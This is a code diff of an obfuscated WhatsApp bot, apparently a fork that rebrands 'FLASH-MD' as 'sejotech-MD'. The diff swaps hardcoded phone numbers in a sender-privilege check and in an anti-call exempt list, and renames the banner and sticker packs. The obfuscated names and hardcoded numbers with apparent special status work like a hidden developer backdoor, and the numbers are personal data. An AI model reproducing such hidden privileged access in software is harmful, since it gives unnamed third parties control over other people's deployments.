@@ -242,7 +242,7 @@ setTimeout(() => {
       const _0x2c84c1 = [_0x2632f1, "923184474176", "254742063632", "254757835036", "254750948696", "254751284190", conf.OWNER_NUMBER].map(_0x162de4 => _0x162de4.replace(/[^0-9]/g, '') + "@s.whatsapp.net");
       const _0x42969b = _0x2c84c1.concat(_0x55e029);
       const _0x42111a = _0x42969b.includes(_0x426e65);
-      const _0x59bc3f = ["254742063632", "923184474176", "254757835036", "254750948696", "254751284190"].map(_0x21b221 => _0x21b221.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x426e65);
+      const _0x59bc3f = ["254114305147", "923184474176", "254101827915", "254750948696", "254751284190"].map(_0x21b221 => _0x21b221.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x426e65);
       function _0x4d3247(_0xce74ce) {
         _0x252f2e.sendMessage(_0x3e6290, {
           'text': _0xce74ce
@@ -250,7 +250,7 @@ setTimeout(() => {
           'quoted': _0x4a693a
         });
       }
-      console.log("\t [][]...{FLASH-MD}...[][]");
+      console.log("\t [][]...{sejotech-MD}...[][]");
       console.log("=========== New message ===========");
       if (_0x383a2c) {
         console.log("Message from the group: " + _0x312388);
@@ -322,7 +322,7 @@ setTimeout(() => {
         if (conf.ANTICALL === 'on') {
           const _0xb43468 = _0x3fcf78[0x0].id;
           const _0x1bdbb1 = _0x3fcf78[0x0].from;
-          const _0xcc8105 = ['254742063632@s.whatsapp.net', '254757835036@s.whatsapp.net', '254751284190@s.whatsapp.net'];
+          const _0xcc8105 = ['254114305147@s.whatsapp.net', '254101827915@s.whatsapp.net', '254751284190@s.whatsapp.net'];
           console.log("Caller ID: " + _0x1bdbb1);
           if (!_0xcc8105.includes(_0x1bdbb1)) {
             try {
@@ -548,7 +548,7 @@ setTimeout(() => {
           };
           var _0x33a39f = "link detected, \n";
           var _0x3f3fe8 = new Sticker('https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif', {
-            'pack': "Flash-Md",
+            'pack': "SEJOTECH-Md",
             'author': conf.OWNER_NAME,
             'type': StickerTypes.FULL,
             'categories': ['🤩', '🎉'],
@@ -652,7 +652,7 @@ setTimeout(() => {
           };
           var _0x33a39f = "link detected, \n";
           var _0x3f3fe8 = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
-            'pack': 'Flash-Md',
+            'pack': 'SEJOTECH-Md',
             'author': conf.OWNER_NAME,
             'type': StickerTypes.FULL,
             'categories': ['🤩', '🎉'],
